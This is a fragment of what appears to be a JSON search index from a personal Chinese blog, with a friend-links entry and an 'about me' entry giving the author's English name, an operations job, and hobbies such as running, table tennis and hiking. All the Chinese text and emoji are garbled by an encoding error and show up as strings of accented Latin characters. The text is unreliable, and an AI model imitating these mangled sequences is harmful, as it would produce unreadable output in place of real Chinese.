ä¸€ä¸ªè®°å½•æŠ€æœ¯ã€é˜…è¯»ã€ç”Ÿæ´»çš„åšå®¢","title":"ğŸ¤å‹é“¾"},{"content":"å…³äºæˆ‘\nè‹±æ–‡å: nier èŒä¸š: è¿ç»´ è¿åŠ¨: è·‘æ­¥ã€ä¹’ä¹“çƒã€çˆ¬å±± ","permalink":"https://senmer.github.io/zh/about/","summary":"å…³äºæˆ‘ è‹±æ–‡å: nier èŒä¸š: è¿ç»´ è¿åŠ¨: è·‘æ­¥ã€ä¹’ä¹“çƒã€çˆ¬å±±","title":"ğŸ™‹ğŸ»â€â™‚ï¸å…³äº"}]